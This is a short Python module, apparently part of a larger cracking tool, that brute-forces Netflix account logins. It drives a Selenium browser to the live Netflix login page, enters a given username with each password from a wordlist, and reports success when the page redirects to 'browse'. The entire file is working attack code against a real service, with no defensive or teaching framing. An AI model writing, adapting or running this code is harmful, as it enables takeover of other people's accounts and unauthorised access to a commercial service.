import time
from selenium.webdriver.common.keys import Keys


class Netflix:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://www.netflix.com/it-en/login'

    def check_user(self):
        return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            time.sleep(0.5)
            email = self.browser.driver.find_element_by_name('userLoginId')
            email.clear()
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_name('password')
            pwd.clear()
            pwd.send_keys(password)
            pwd.send_keys(Keys.RETURN)

            self.browser.wait_page_loaded()
            time.sleep(1)

            url = self.browser.driver.current_url
            if (url != self.url) and ('browse' in url):
                found = password
                break
            time.sleep(self.delay)

        return found
